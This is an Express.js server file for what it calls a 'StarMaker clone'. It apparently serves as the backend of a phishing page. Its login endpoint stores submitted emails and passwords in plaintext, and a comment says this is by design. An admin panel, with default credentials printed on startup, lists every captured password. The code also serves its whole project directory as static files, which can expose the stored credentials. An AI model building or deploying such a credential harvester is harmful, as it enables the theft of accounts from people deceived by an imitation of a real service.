const express = require('express');
const fs = require('fs/promises');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, 'data');
const SUBMISSIONS_FILE = path.join(DATA_DIR, 'submissions.json');
const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
const sessions = new Set();

app.use(express.json());
app.use(express.static(__dirname));

// Passwords are stored in plaintext by design for admin viewing.

function parseCookies(cookieHeader = '') {
    return Object.fromEntries(
        cookieHeader
            .split(';')
            .map(cookie => cookie.trim().split('='))
            .filter(parts => parts.length === 2)
    );
}

function requireAdmin(req, res, next) {
    const cookies = parseCookies(req.headers.cookie);
    if (!cookies.adminToken || !sessions.has(cookies.adminToken)) {
        return res.status(401).json({ message: 'Admin login required.' });
    }
    next();
}

async function readSubmissions() {
    try {
        const file = await fs.readFile(SUBMISSIONS_FILE, 'utf8');
        return JSON.parse(file);
    } catch (error) {
        if (error.code === 'ENOENT') {
            return [];
        }
        throw error;
    }
}

async function saveSubmission(submission) {
    await fs.mkdir(DATA_DIR, { recursive: true });
    const submissions = await readSubmissions();
    submissions.push(submission);
    await fs.writeFile(SUBMISSIONS_FILE, JSON.stringify(submissions, null, 2));
}

app.post('/api/login-submissions', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ message: 'Email and password are required.' });
    }

    const submission = {
        email,
        password: password,
        submittedAt: new Date().toISOString(),
        userAgent: req.get('user-agent') || ''
    };

    try {
        await saveSubmission(submission);
        res.status(201).json({ message: 'Submission saved.' });
    } catch (error) {
        console.error('Failed to save submission:', error);
        res.status(500).json({ message: 'Failed to save submission.' });
    }
});

app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;

    if (username !== ADMIN_USERNAME || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ message: 'Invalid admin username or password.' });
    }

    const token = crypto.randomBytes(32).toString('hex');
    sessions.add(token);
    res.cookie('adminToken', token, {
        httpOnly: true,
        sameSite: 'strict',
        secure: false,
        maxAge: 1000 * 60 * 60 * 8
    });
    res.json({ message: 'Logged in.' });
});

app.post('/api/admin/logout', requireAdmin, (req, res) => {
    const cookies = parseCookies(req.headers.cookie);
    sessions.delete(cookies.adminToken);
    res.clearCookie('adminToken');
    res.json({ message: 'Logged out.' });
});

app.get('/api/admin/submissions', requireAdmin, async (req, res) => {
    try {
        const submissions = await readSubmissions();
        res.json({
            submissions: submissions.map((submission, index) => ({
                id: index + 1,
                email: submission.email,
                submittedAt: submission.submittedAt,
                userAgent: submission.userAgent || '',
                password: submission.password || null,
                passwordStatus: submission.password ? 'Stored as plaintext' : (submission.passwordHash ? 'Stored as hash' : 'Not stored')
            })).reverse()
        });
    } catch (error) {
        console.error('Failed to read submissions:', error);
        res.status(500).json({ message: 'Failed to read submissions.' });
    }
});

app.listen(PORT, () => {
    console.log(`StarMaker clone running at http://localhost:${PORT}`);
    console.log(`Admin panel available at http://localhost:${PORT}/admin.html`);
    console.log(`Default admin login: ${ADMIN_USERNAME} / ${ADMIN_PASSWORD}`);
});
